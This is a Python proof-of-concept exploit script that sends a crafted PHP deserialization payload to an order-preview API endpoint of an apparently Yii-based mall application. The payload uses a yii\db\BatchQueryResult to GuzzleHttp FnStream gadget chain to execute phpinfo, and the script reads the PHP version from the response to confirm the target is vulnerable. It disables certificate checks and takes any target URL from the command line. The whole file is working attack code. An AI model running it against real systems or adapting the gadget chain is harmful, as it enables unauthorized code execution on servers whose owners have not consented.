#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

regular = "(PHP Version [0-9\.]+)"

def verify(site):
    burp0_url = site + "/web/index.php?r=api/testOrderSubmit/index/preview&_mall_id=1"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded"}
    burp0_data = {"form_data": "O:23:\"yii\\db\\BatchQueryResult\":1:{s:36:\"\x00yii\\db\\BatchQueryResult\x00_dataReader\";O:24:\"GuzzleHttp\\Psr7\\FnStream\":1:{s:9:\"_fn_close\";s:7:\"phpinfo\";}}"}
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
    info = re.findall(regular, r.text)
    if len(info) != 0:
        return info[0]
    else:
        return ""


if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，获取数PHP版本为：", info)
    else:
        print("[-]漏洞不存在")
